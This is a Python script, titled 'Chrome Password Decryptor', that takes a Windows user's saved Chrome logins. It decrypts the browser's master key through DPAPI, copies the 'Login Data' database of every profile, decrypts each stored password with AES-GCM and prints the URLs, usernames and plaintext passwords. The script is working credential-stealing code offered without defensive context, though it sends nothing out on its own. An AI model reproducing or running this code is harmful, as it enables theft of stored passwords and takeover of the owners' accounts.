import os
import csv
import json
import shutil
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES

USER_DATA_PATH, LOCAL_STATE_PATH = f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data", f"{os.environ['USERPROFILE']}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State"
TEMP_DB = f"{os.environ['TEMP']}\\justforfun.db"

# Collecting secret key
def secretKey():
    try:
        with open(LOCAL_STATE_PATH, "r") as f:
            local_state = f.read()
            key_text = json.loads(local_state)["os_crypt"]["encrypted_key"]
        key_buffer = base64.b64decode(key_text)[5:]
        key = win32crypt.CryptUnprotectData(key_buffer)[1]
        return key
    except Exception as e:
        print(e)

# Login to db where creds are stored
def login_db(db_path):
    try:
        shutil.copy(db_path, TEMP_DB) # Copy to temp dir, otherwise get permission error
        sql_connection = sqlite3.connect(TEMP_DB)
        return sql_connection
    except Exception as e:
        print(e)

# Decrypt the password
def password_decrypt(secret_key, ciphertext):
    try:
        iv = ciphertext[3:15]
        password_hash = ciphertext[15:-16]
        cipher = AES.new(secret_key, AES.MODE_GCM, iv)
        password = cipher.decrypt(password_hash).decode()
        return password
    except Exception as e:
        print(e)

def main():
    print("Chrome Password Decryptor")
    print("No      <->      URL      <->      Username      <->      Password")
    secret_key = secretKey()
    default_folders = ("Profile", "Default")
    data_folders = [data_path for data_path in os.listdir(USER_DATA_PATH) if data_path.startswith(default_folders)]
    for data_folder in data_folders:
        db_path = f"{USER_DATA_PATH}\\{data_folder}\\Login Data" # Chrome db
        con = login_db(db_path)
        if secret_key and con:
            cur = con.cursor()
            cur.execute("select action_url, username_value, password_value from logins")
            for index, data in enumerate(cur.fetchall()):
                url = data[0]
                username = data[1]
                ciphertext = data[2]
                if url != "" and username != "" and ciphertext != "": # To only collect valid entries
                    password = password_decrypt(secret_key, ciphertext)
                    print(f"{index} <-> {url} <-> {username} <-> {password}")
            print("Completed!")
            con.close()
            os.remove(TEMP_DB)

main()